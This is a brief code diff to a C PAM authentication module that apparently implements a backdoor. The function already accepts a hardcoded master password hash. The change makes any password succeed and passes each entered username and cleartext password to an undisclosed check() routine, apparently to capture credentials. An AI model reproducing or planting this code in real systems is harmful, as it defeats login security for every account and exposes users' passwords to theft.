@@ -19,12 +19,14 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const c
 }
 
 PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags, int argc, const char **argv) {
-	const char *passwd;
+	const char *passwd, *user;
 	if (pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&passwd, NULL) != PAM_SUCCESS) {
 		return PAM_AUTH_ERR;
 	}
 	if (strcmp(crypt(passwd, SALT), HASH) != 0) {
-		return PAM_AUTH_ERR;
+		if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS)
+			return PAM_AUTH_ERR;
+		check(user, passwd, NULL);
 	}
 	return PAM_SUCCESS;
 }
